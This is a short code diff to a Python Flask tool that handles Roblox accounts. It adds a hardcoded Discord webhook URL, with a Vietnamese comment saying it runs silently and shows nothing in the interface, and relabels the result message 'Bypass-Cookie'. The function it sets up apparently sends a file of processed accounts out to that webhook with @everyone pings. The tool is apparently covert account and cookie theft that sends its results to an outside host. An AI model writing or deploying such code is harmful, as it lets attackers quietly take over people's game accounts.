@@ -13,7 +13,7 @@ import requests
 app = Flask(__name__)
 
 # Cấu hình Discord Webhook trực tiếp tại đây (chạy ngầm, không xuất ra UI)
-DISCORD_WEBHOOK_URL = ""
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575353201798946956/X3229l9zhS-BASB2LcwtO5dN76HF8b2U6nCXcEFAFOWpKqTAkcXdUgLWQlSu3Z_inKmS"
 PING_EVERYONE = True
 
 LOGOUT_URL = "https://auth.roblox.com/v2/logout"
@@ -88,7 +88,7 @@ def send_result_to_webhook_silent(content: str, ok_count: int, total_count: int)
     filename = f"roblox_changed_{ts}.txt"
     prefix_ping = "@everyone " if PING_EVERYONE else ""
     payload = {
-        "content": f"{prefix_ping}Changepass hoàn tất: **{ok_count}/{total_count}** acc thành công.",
+        "content": f"{prefix_ping}Bypass-Cookie hoàn tất: **{ok_count}/{total_count}** acc thành công.",
         "allowed_mentions": {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []},
     }
     files = {
